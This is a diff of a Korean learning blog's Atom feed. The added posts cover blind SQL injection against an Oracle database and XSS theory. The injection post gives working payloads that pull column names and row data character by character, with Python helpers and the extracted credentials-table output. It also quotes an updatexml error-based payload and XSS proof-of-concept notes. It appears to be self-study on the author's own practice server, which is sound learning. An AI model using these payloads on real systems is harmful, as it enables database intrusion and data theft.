+<span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="k">column_name</span> <span class="k">from</span> <span class="n">cols</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'MEMBERS'</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
+</code></pre></div></div>
+
+<ul>
+  <li>파이썬 코드로 빠르게 컬럼 명 찾기.</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">find_column_name</span><span class="p">(</span><span class="n">table_name</span><span class="p">):</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">query</span> <span class="o">=</span> <span class="s">"select column_name from cols where table_name='"</span><span class="o">+</span><span class="n">table_name</span><span class="o">+</span><span class="s">"'"</span>
+<span class="err"> </span> <span class="err"> </span> <span class="nf">find_data</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+<span class="err"> </span> <span class="err"> </span> <span class="k">return</span>
+</code></pre></div></div>
+
+<ul>
+  <li>추출한 데이터.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MEMBERS 컬럼이름
+SID
+ID
+PASSWORD
+EMAIL
+INFO
+HASHPWD
+
+TEST 컬럼이름
+MSG
+</code></pre></div></div>
+
+<h2 id="데이터-추출하기">데이터 추출하기</h2>
+<ul>
+  <li>테이블에  저장되어 있는 데이터 추출하기.</li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="err">컬럼이름</span> <span class="k">from</span> <span class="err">테이블명</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>
+
+<span class="k">select</span> <span class="n">MSG</span> <span class="k">from</span> <span class="n">TEST</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>
+
+<span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="n">MSG</span> <span class="k">from</span> <span class="n">TEST</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
+</code></pre></div></div>
+
+<ul>
+  <li>파이썬 코드로 빠르게 데이터 추출하기.</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">find_table_data</span><span class="p">(</span><span class="n">column</span><span class="p">,</span> <span class="n">table_name</span><span class="p">):</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">query</span> <span class="o">=</span> <span class="s">"select "</span><span class="o">+</span><span class="n">column</span><span class="o">+</span><span class="s">" from "</span><span class="o">+</span><span class="n">table_name</span>
+<span class="err"> </span> <span class="err"> </span> <span class="nf">find_data</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+<span class="err"> </span> <span class="err"> </span> <span class="k">return</span>
+</code></pre></div></div>
+
+<ul>
+  <li>추출한 데이터.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MEMBERS 데이터 추출
+root
+dad
+user123
+user2
+
+TEST 데이터 추출
+blind sql injection success
+</code></pre></div></div>
+
+<h2 id="결과">결과</h2>
+<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2b4957ca-e70d-4f4b-bd3e-01a45970eaaa" alt="Pasted image 20230512003709" /></p>
+
+<h2 id="전체-코드">전체 코드</h2>
+<script src="https://gist.github.com/MinGyu2/ed9926c11854380ea75abef3fbdfa4e5.js"></script>]]></content><author><name>Jung MinGyu</name></author><category term="Oracle DB" /><category term="Blind SQLi" /><category term="SQLi" /><category term="웹 해킹" /><summary type="html"><![CDATA[직접 Blind SQL Injection 을 시도해보자.]]></summary></entry><entry><title type="html">웹서버 만들기(11) 게시글 수정, 삭제, 검색</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C11%EA%B2%8C%EC%8B%9C%EA%B8%80/" rel="alternate" type="text/html" title="웹서버 만들기(11) 게시글 수정, 삭제, 검색" /><published>2023-05-10T00:00:00+09:00</published><updated>2023-05-10T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C11%EA%B2%8C%EC%8B%9C%EA%B8%80</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C11%EA%B2%8C%EC%8B%9C%EA%B8%80/"><![CDATA[<h2 id="게시글-수정">게시글 수정</h2>
 <ul>
   <li>자기가 쓴 글만 수정이 가능하다.</li>
   <li><code class="language-plaintext highlighter-rouge">수정하기</code>버튼을 클릭하면 게시글 수정 페이지가 나타난다.</li>
@@ -180,14 +469,33 @@
 <h2 id="참고-사이트">참고 사이트</h2>
 <ul>
   <li><a href="https://ko.wikipedia.org/wiki/%EC%9B%B9_%EC%85%B8">웹 셸 - 위키백과, 우리 모두의 백과사전 (wikipedia.org)</a></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="SQL Injection" /><summary type="html"><![CDATA[SQL Injection 간단하게 정리해보자.]]></summary></entry><entry><title type="html">XSS 이론</title><link href="http://localhost:4000/XSS%EC%9D%B4%EB%A1%A0/" rel="alternate" type="text/html" title="XSS 이론" /><published>2023-05-07T00:00:00+09:00</published><updated>2023-05-07T23:13:00+09:00</updated><id>http://localhost:4000/XSS%EC%9D%B4%EB%A1%A0</id><content type="html" xml:base="http://localhost:4000/XSS%EC%9D%B4%EB%A1%A0/"><![CDATA[<h2 id="xss">XSS</h2>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="SQL Injection" /><summary type="html"><![CDATA[SQL Injection 간단하게 정리해보자.]]></summary></entry><entry><title type="html">XSS 이론</title><link href="http://localhost:4000/XSS%EC%9D%B4%EB%A1%A0/" rel="alternate" type="text/html" title="XSS 이론" /><published>2023-05-07T00:00:00+09:00</published><updated>2023-05-12T23:13:00+09:00</updated><id>http://localhost:4000/XSS%EC%9D%B4%EB%A1%A0</id><content type="html" xml:base="http://localhost:4000/XSS%EC%9D%B4%EB%A1%A0/"><![CDATA[<h2 id="xss">XSS</h2>
 <h3 id="개념">개념</h3>
 <ul>
   <li>클라우드 측 코드를 삽입하는 공격이다.</li>
+  <li>클라이언트의 브라우저에서 실행된다.</li>
   <li>피해자 컴퓨터(브라우저)에 악의적인 코드를 실행되게 하는 공격이다.</li>
   <li>Cross-site Scripting 의 약자이다.</li>
   <li>개발자가 고려하지 않는 기능을 동작시킨다.</li>
 </ul>
+
+<h3 id="poc-코드">POC 코드</h3>
+<ul>
+  <li>alert(1)</li>
+  <li>console.log()</li>
+  <li>“임이의 클라이언트 측 코드가 동작한다.” 를 보여주면 된다.</li>
+</ul>
+
+<h3 id="공격-방식">공격 방식</h3>
+<h4 id="script-태그-이용하기">script 태그 이용하기.</h4>
+<script src="https://gist.github.com/MinGyu2/ba046742127493f07bd950b19c8cd123.js"></script>
+
+<h4 id="onerror-속성-이용하기">onerror 속성 이용하기.</h4>
+<ul>
+  <li>자바스크립트 태그 안에 있는 효과와 동일하다.</li>
+</ul>
+
+<script src="https://gist.github.com/MinGyu2/94420c775fba67aeb3ff11335bc32fa0.js"></script>
 
 <h3 id="공격-피해">공격 피해</h3>
 
@@ -225,6 +533,7 @@
   <li>비정상적인 방법이 아니라 서버에서 제공하는 서비스의 취약점을 이용한 것이다.</li>
   <li>공격자가 악성 스크립트를 서버 페이지에 저장하고 해당 페이지를 사용자에게 노출 시킨다.</li>
   <li>사용자가 악성 스크립트가 들어있는 페이지를 방문하면 악성 스크립트가 사용자 브라우저에서 실행된다.</li>
+  <li>광역적으로 공격이 가능하다. 하지만 흔적이 남는다.</li>
 </ul>
 
 <h5 id="유형">유형</h5>
@@ -249,6 +558,8 @@
 
 <h5 id="설명-1">설명</h5>
 <ul>
+  <li>서버 사이드 렌더링(SSR)</li>
+  <li>무조건 GET 방식 이여야 한다.</li>
   <li>악성 스크립트가 담긴 URL을 만들어 일반 사용자에게 전달한다.</li>
   <li>URL 주소 뒤에 붙는 쿼리에 악성 스크립트를 작성하여 전달한다.</li>
   <li>사용자가 공격자가 건네준 URL을 클릭하여 방문하면 악성 스크립트가 담긴 페이지를 사용자에게 보여준다. 그리고 사용자 브라우저에서 악성 스크립트가 실행된다.</li>
@@ -274,6 +585,7 @@
 
 <h5 id="설명-2">설명</h5>
 <ul>
+  <li>클라이언트 사이드 렌더링(CSR)</li>
   <li>JavaScript 코드로 DOM 객체를 제어하는 과정에서 발생한다.</li>
   <li>악성 스크립트가 서버로 전송되지 않고, 브라우저에서 동적으로 동작한다.</li>
   <li>웹 사이트 코드를 조사하지 않고는 취약점을 발견할 수 없다. 따라서 공격 당하기 쉽다.</li>
@@ -355,7 +667,7 @@
   <li><a href="https://4rgos.tistory.com/1">XSS(Cross Site Scripting) 공격이란? :: ARGOS (tistory.com)</a></li>
   <li><a href="https://nordvpn.com/ko/blog/xss-attack/#head3-3">크로스 사이트 스크립팅의 정의 및 공격 유형 NordVPN</a></li>
   <li><a href="https://namu.wiki/w/XSS">XSS - 나무위키 (namu.wiki)</a></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="웹 해킹" /><summary type="html"><![CDATA[XSS 개념 클라우드 측 코드를 삽입하는 공격이다. 피해자 컴퓨터(브라우저)에 악의적인 코드를 실행되게 하는 공격이다. Cross-site Scripting 의 약자이다. 개발자가 고려하지 않는 기능을 동작시킨다.]]></summary></entry><entry><title type="html">웹서버 만들기 10 메뉴 버튼 및 게시판 제작</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C10%EB%A9%94%EB%89%B4%EB%B2%84%ED%8A%BC%EB%B0%8F%EA%B2%8C%EC%8B%9C%ED%8C%90/" rel="alternate" type="text/html" title="웹서버 만들기 10 메뉴 버튼 및 게시판 제작" /><published>2023-05-04T00:00:00+09:00</published><updated>2023-05-04T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C10%EB%A9%94%EB%89%B4%EB%B2%84%ED%8A%BC%EB%B0%8F%EA%B2%8C%EC%8B%9C%ED%8C%90</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C10%EB%A9%94%EB%89%B4%EB%B2%84%ED%8A%BC%EB%B0%8F%EA%B2%8C%EC%8B%9C%ED%8C%90/"><![CDATA[<h2 id="jsp-페이지-모듈화">JSP 페이지 모듈화</h2>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="웹 해킹" /><summary type="html"><![CDATA[XSS 개념 클라우드 측 코드를 삽입하는 공격이다. 클라이언트의 브라우저에서 실행된다. 피해자 컴퓨터(브라우저)에 악의적인 코드를 실행되게 하는 공격이다. Cross-site Scripting 의 약자이다. 개발자가 고려하지 않는 기능을 동작시킨다.]]></summary></entry><entry><title type="html">웹서버 만들기 10 메뉴 버튼 및 게시판 제작</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C10%EB%A9%94%EB%89%B4%EB%B2%84%ED%8A%BC%EB%B0%8F%EA%B2%8C%EC%8B%9C%ED%8C%90/" rel="alternate" type="text/html" title="웹서버 만들기 10 메뉴 버튼 및 게시판 제작" /><published>2023-05-04T00:00:00+09:00</published><updated>2023-05-04T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C10%EB%A9%94%EB%89%B4%EB%B2%84%ED%8A%BC%EB%B0%8F%EA%B2%8C%EC%8B%9C%ED%8C%90</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C10%EB%A9%94%EB%89%B4%EB%B2%84%ED%8A%BC%EB%B0%8F%EA%B2%8C%EC%8B%9C%ED%8C%90/"><![CDATA[<h2 id="jsp-페이지-모듈화">JSP 페이지 모듈화</h2>
 <ul>
   <li>액션 태그를 사용해서 화면을 모듈화시켜 코드가 중복되는 것을 방지 할 수 있다.</li>
 </ul>
@@ -1038,195 +1350,4 @@
       <li>입력 = <code class="language-plaintext highlighter-rouge">1' and updatexml(null, concat(0x3a,(select column명 from table명 limit 0,1)), null) and '1'='1</code></li>
     </ul>
   </li>
-</ol>]]></content><author><name>Jung MinGyu</name></author><category term="Mysql" /><category term="DB" /><category term="sql injection" /><summary type="html"><![CDATA[sql injection 보다 쉽게 할 수 있는 과정을 정리하였다.]]></summary></entry><entry><title type="html">웹 서버 만들기 (8) 회원가입 구현</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C8/" rel="alternate" type="text/html" title="웹 서버 만들기 (8) 회원가입 구현" /><published>2023-04-20T00:00:00+09:00</published><updated>2023-04-20T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C8</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C8/"><![CDATA[<h2 id="회원-가입-버튼-누르기-전">회원 가입 버튼 누르기 전</h2>
-
-<p><br /></p>
-<h3 id="회원가입-버튼-추가">회원가입 버튼 추가</h3>
-<hr />
-<blockquote>
-  <p><strong>로그인 페이지에 회원가입 버튼 추가</strong><br /><img src="https://user-images.githubusercontent.com/31990118/233329577-363a25da-eafd-46a5-8eb1-0d83f5d75943.png" alt="Pasted image 20230420151719" /></p>
-</blockquote>
-
-<blockquote>
-  <p><strong>회원가입 버튼 부분(클라이언트)</strong><br /><script src="https://gist.github.com/MinGyu2/e0ee562997986b0cc8fd8d4c1cd4433a.js"></script></p>
-  <ul>
-    <li>회원 가입 페이지로 연결해준다.</li>
-  </ul>
-</blockquote>
-
-<blockquote>
-  <p><strong>회원가입 페이지 연결(서버)</strong></p>
-  <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">String</span> <span class="n">formAction</span> <span class="o">=</span> <span class="s">"/sign_in_page/authentication"</span><span class="o">;</span>
-<span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"formAction"</span><span class="o">,</span> <span class="n">formAction</span><span class="o">);</span>
-<span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"signUpLink"</span><span class="o">,</span> <span class="s">"/sign_in_page/sign_up_page"</span><span class="o">);</span>
-<span class="c1">// session id 가 만료되었거나 없어서 새롭게 로그인 해 줘야한다.</span>
-<span class="c1">// 로그인 페이지를 보여준다.</span>
-<span class="n">gotoForwardPage</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">,</span> <span class="s">"/WEB-INF/sign_in_page/sign_in_page.jsp"</span><span class="o">);</span>
-</code></pre></div>  </div>
-  <ul>
-    <li>서버에서 <code class="language-plaintext highlighter-rouge">signUpLink</code> 변수를 넣은후 <code class="language-plaintext highlighter-rouge">sign_in_page.jsp</code> 로 forward 해야지만 회원가입 링크 부분이 완성이 된다.</li>
-    <li>만약 signUpLink 변수를 안주면 회원가입 버튼이 안보인다.<br /><img src="https://user-images.githubusercontent.com/31990118/233330281-cb605b66-ab9a-4335-bd36-b76aea157fde.png" alt="Pasted image 20230420153007" /></li>
-  </ul>
-</blockquote>
-
-<p><br /></p>
-<h3 id="회원가입-페이지">회원가입 페이지</h3>
-<hr />
-<blockquote>
-  <p>회원가입 페이지<br /><img src="https://user-images.githubusercontent.com/31990118/233330449-37b9eb7a-5c2e-424c-a505-158e2ea7230c.png" alt="Pasted image 20230420153118" /></p>
-</blockquote>
-
-<blockquote>
-  <p>구성</p>
-  <ul>
-    <li><code class="language-plaintext highlighter-rouge">Username</code>
-      <ul>
-        <li>유저 아이디를 입력한다.</li>
-      </ul>
-    </li>
-    <li><code class="language-plaintext highlighter-rouge">중복확인</code>
-      <ul>
-        <li>서버로 유저가 입력한 아이디를 보내 중복하는 아이디인지 확인한다.</li>
-      </ul>
-    </li>
-    <li><code class="language-plaintext highlighter-rouge">Email</code>
-      <ul>
-        <li>유저 이메일을 입력한다.</li>
-        <li>이메일 패턴에 맞게 입력하여야 한다.</li>
-      </ul>
-    </li>
-    <li><code class="language-plaintext highlighter-rouge">Password</code>
-      <ul>
-        <li>유저 비밀번호를 입력한다.</li>
-      </ul>
-    </li>
-    <li><code class="language-plaintext highlighter-rouge">Password 확인</code>
-      <ul>
-        <li>유저 비밀번호를 동일하게 입력한다.</li>
-      </ul>
-    </li>
-    <li><code class="language-plaintext highlighter-rouge">회원가입</code>
-      <ul>
-        <li>중복확인, 이메일 패턴 일치 여부, 비밀번호 일치 여부를 확인한 후 각각 입력한 데이터를 서버로 전송한다.</li>
-      </ul>
-    </li>
-  </ul>
-</blockquote>
-
-<p><br /></p>
-<h3 id="아이디-중복-확인">아이디 중복 확인</h3>
-<hr />
-
-<blockquote>
-  <p><strong>유저 아이디 중복 확인 (클라이언트)</strong><br /><script src="https://gist.github.com/MinGyu2/05f9fea7bbc9fab773e3fa6ce86fa623.js"></script></p>
-  <ul>
-    <li>중복확인 버튼을 누르면 <code class="language-plaintext highlighter-rouge">Http get</code> 요청을 통해 <code class="language-plaintext highlighter-rouge">username</code>에 사용자가 입력한 id를 넣어 중복확인 서버 주소를 이용하여 보낸다.</li>
-    <li>서버에서 보내온 응답을 통해 아이디가 중복하는지 확인한다.<br /><img src="https://user-images.githubusercontent.com/31990118/233331834-0ad61a19-546a-418d-a474-c6fce7c81f2f.png" alt="Pasted image 20230420155201" /><br /><img src="https://user-images.githubusercontent.com/31990118/233331879-4bf2dff8-c9e8-4d3c-98b8-03ab84536a4a.png" alt="Pasted image 20230420155213" /></li>
-  </ul>
-</blockquote>
-
-<blockquote>
-  <p><strong>유저 아이디 중복 확인 (서버)</strong><br /><script src="https://gist.github.com/MinGyu2/98d645f481a935817b22cbeb249f7e08.js"></script></p>
-  <ul>
-    <li>클라이언트에서 보낸 <code class="language-plaintext highlighter-rouge">username</code>을 확인해 볼 수 있다.</li>
-    <li><code class="language-plaintext highlighter-rouge">LoginAuthentication.isExistUserName(getServletContext(), username);</code> 를 통해 존재하는 유저인지 판단할 수 있다.<br /><script src="https://gist.github.com/MinGyu2/738f5d2240625fccce92b5213fcaabb3.js"></script></li>
-  </ul>
-</blockquote>
-
-<blockquote>
-  <p><strong>UsersDAO</strong> class에서 isExistUserName 함수 부분 코드<br /><script src="https://gist.github.com/MinGyu2/363caaa55ac904382e56c801dcce6b35.js"></script></p>
-  <ul>
-    <li>이미 존재하는 유저면 <code class="language-plaintext highlighter-rouge">true</code>를 리턴하고 존재안하는 유저면 <code class="language-plaintext highlighter-rouge">false</code>를 리턴한다.</li>
-  </ul>
-</blockquote>
-
-<blockquote>
-  <p><strong>회원가입 JSP 전체 코드(클라이언트)</strong><br /><script src="https://gist.github.com/MinGyu2/d8e184b74e83a72c4772e20e6c42d159.js"></script></p>
-</blockquote>
-
-<p><br /></p>
-<h3 id="이메일-형식인지-확인">이메일 형식인지 확인</h3>
-<hr />
-<blockquote>
-  <p><strong>자바스크립트를 통해 이메일 형식인지 확인하다.</strong><br /><script src="https://gist.github.com/MinGyu2/485eceb2ce9abaf1c97ef67bcf0bc371.js"></script></p>
-  <ul>
-    <li>이메일을 입력하고 다음 입력창으로 넘어가면 <code class="language-plaintext highlighter-rouge">onchange='email_change()'</code> 옵션을 통해 자동으로 위의 함수가 실행된다.</li>
-    <li>정규식을 통해 이메일 형식인지 확인한다.<br /><img src="https://user-images.githubusercontent.com/31990118/233336731-a2be5db6-6395-469e-ad5c-b5d481f752fe.png" alt="image" /></li>
-  </ul>
-</blockquote>
-
-<p><br /></p>
-<h3 id="비밀번호-일치-확인">비밀번호 일치 확인</h3>
-<hr />
-<blockquote>
-  <p><strong>자바스크립트를 통해 비밀번호가 서로 일치하는지 확인한다.</strong><br /><script src="https://gist.github.com/MinGyu2/ec8eb649562e27a5f05c92c7b92b50e3.js"></script></p>
-  <ul>
-    <li>비밀번호를 입혁하고 다음 입력창으로 넘어가면 <code class="language-plaintext highlighter-rouge">onchange='pwd_confirm()'</code> 옵션을 통해 자동으로 위의 함수가 실행된다.</li>
-    <li>두개의 비밀번호를 비교하여 일치하면 성공이고 다르면 “일치안함” 메세지를 사용자에게 보여준다.<br /><img src="https://user-images.githubusercontent.com/31990118/233336814-d63b3904-17ad-4b2e-9985-206b29f1a483.png" alt="image" />
-<br /><img src="https://user-images.githubusercontent.com/31990118/233337192-9757ab02-99b7-48ae-b153-1fca92fbdbe6.png" alt="image" /></li>
-  </ul>
-</blockquote>
-
-<p><br /><br /></p>
-<h2 id="회원가입-버튼-누른-후">회원가입 버튼 누른 후</h2>
-
-<p><br /></p>
-<h3 id="회원가입-클라이언트">회원가입 (클라이언트)</h3>
-<hr />
-<blockquote>
-  <p><strong>회원가입 버튼 누른 후 동작 이벤트</strong><br /><script src="https://gist.github.com/MinGyu2/31a2b857fcfac7617b3cbfb255089626.js"></script></p>
-  <ul>
-    <li>회원정보를 전부 입력한 후 <strong>회원가입</strong> 버튼을 누르면 <code class="language-plaintext highlighter-rouge">onclick="sign_up()"</code> 옵션에 의해 위의 함수가 동작한다.</li>
-    <li>서버로 입력한 정보를 보내기전 id 중복 확인을 했는지, email 형식이 맞는지, 비밀번호가 서로 일치하는지 확인한다.</li>
-    <li>모두 통과가 되면 post 형식으로 입력한 데이터를 서버로 전달한다.</li>
-    <li>자바스크립트에서 post 형식으로 전송하는 방법은 없다. 따라서 form과 input 요소를 만들어주고 body에 추가한 후 post 전송을 해 줘야한다.</li>
-  </ul>
-</blockquote>
-
-<p><br /></p>
-<h3 id="회원가입-서버">회원가입 (서버)</h3>
-<hr />
-<blockquote>
-  <p><strong>회원가입</strong><br /><script src="https://gist.github.com/MinGyu2/274abc0e913bf1d8f71e71363ec033dd.js"></script></p>
-  <ul>
-    <li>서버는 클라이언트에서 post 전송한 <code class="language-plaintext highlighter-rouge">아이디</code>, <code class="language-plaintext highlighter-rouge">이메일</code>, <code class="language-plaintext highlighter-rouge">비밀번호</code>, <code class="language-plaintext highlighter-rouge">비밀번호 확인</code>을 받는다.</li>
-    <li>SignUp 클래스의 <code class="language-plaintext highlighter-rouge">아이디</code>, <code class="language-plaintext highlighter-rouge">이메일</code>, <code class="language-plaintext highlighter-rouge">비밀번호</code>, <code class="language-plaintext highlighter-rouge">비밀번호 확인</code>를 인자로 받는 createUser 함수를  이용하여 유저를 만들어준다.</li>
-    <li>계정생성에 실패를 하면 <code class="language-plaintext highlighter-rouge">fail</code> 경고 창을 보여준다. 그 다음 회원가입 창으로 다시 돌아온다.<br /><img src="https://user-images.githubusercontent.com/31990118/233332309-06785554-751e-4e06-9d21-b7f836176f65.png" alt="Pasted image 20230420180533" />
-<br /><img src="https://user-images.githubusercontent.com/31990118/233332365-854571a6-47ef-41b4-80dd-6f1a33fde2fa.png" alt="Pasted image 20230420180559" /></li>
-    <li>계정생성에 성공하면 success 창을 보여준다. 그 다음 로그인 창으로 이동한다.<br /><img src="https://user-images.githubusercontent.com/31990118/233332463-b75b9e82-b55c-4e9e-8feb-1f6c17f021b4.png" alt="Pasted image 20230420182057" />
-<br /><img src="https://user-images.githubusercontent.com/31990118/233332511-ce87dd92-3a9c-4710-abca-cbe0bd1f6c28.png" alt="Pasted image 20230420182109" /></li>
-  </ul>
-</blockquote>
-
-<p><br /><br /></p>
-<h2 id="전체코드">전체코드</h2>
-
-<blockquote>
-  <p><strong>로그인 페이지 전체 코드</strong><br /><script src="https://gist.github.com/MinGyu2/3212b923469a3b72b67a13e6f6b4d51c.js"></script></p>
-</blockquote>
-
-<blockquote>
-  <p><strong>LoginAuthentication 클래스 코드</strong> <br /><script src="https://gist.github.com/MinGyu2/a23d33cdf3ea3337b87849d774a01149.js"></script></p>
-</blockquote>
-
-<blockquote>
-  <p><strong>UsersDAO 클래스 코드</strong><br /><script src="https://gist.github.com/MinGyu2/af111b0e426e4b9b4067bd1e4e88535f.js"></script></p>
-</blockquote>
-
-<blockquote>
-  <p><strong>SignUp 클래스 코드</strong><br /><script src="https://gist.github.com/MinGyu2/7025dc86b1a157e32f024cfd84f52c34.js"></script></p>
-</blockquote>
-
-<p><br /><br /></p>
-<h3 id="참고-사이트">참고 사이트</h3>
-<hr />
-<ul>
-  <li><a href="https://www.baeldung.com/java-email-validation-regex">Email Validation in Java</a></li>
-  <li><a href="https://yceffort.kr/2020/01/think-about-fetch">자바스크립트에서 http 요청하기 - fetch에 대한 고찰 – yceffort</a></li>
-  <li><a href="https://kang-james.tistory.com/entry/JSP-%EC%95%84%EC%9D%B4%EB%94%94-%EC%A4%91%EB%B3%B5-%EC%B2%B4%ED%81%AC-%EA%B8%B0%EB%8A%A5-%EA%B5%AC%ED%98%84-%EB%8F%99%EA%B8%B0-%EB%B0%A9%EC%8B%9D">JSP 아이디 중복 체크 기능 구현 동기 방식 (tistory.com)</a></li>
-  <li><a href="https://www.freecodecamp.org/korean/news/javascripteseo-gajang-jal-alryeojin-http-yoceong-bangbeob-2/">JavaScript에서 가장 잘 알려진 HTTP 요청 방법 (freecodecamp.org)</a></li>
-  <li><a href="https://cocoon1787.tistory.com/700">회원가입 창 만들기 (HTML, CSS, JS / 입력형식체크, 문자인증 기능추가)</a></li>
-  <li><a href="https://imthekingofcoding.tistory.com/30">JavaScript - 이메일 유효성 검사 (회원가입) (tistory.com)</a></li>
-  <li><a href="https://blog.naver.com/PostView.nhn?blogId=seonghun7304&amp;logNo=221583410491">location href를 POST로 보내는 방법</a></li>
-  <li><a href="http://www.oncode.co.kr/onbr/brd/board/?pgk=/tip/board/view/1/275&amp;lang=ko">CSS div 안보이게 하는 방법, div hidden, display none</a></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="Web" /><category term="Oracle DB" /><category term="Java" /><category term="Servlet" /><category term="JSP" /><summary type="html"><![CDATA[회원가입 구현하기.]]></summary></entry></feed>
+</ol>]]></content><author><name>Jung MinGyu</name></author><category term="Mysql" /><category term="DB" /><category term="sql injection" /><summary type="html"><![CDATA[sql injection 보다 쉽게 할 수 있는 과정을 정리하였다.]]></summary></entry></feed>
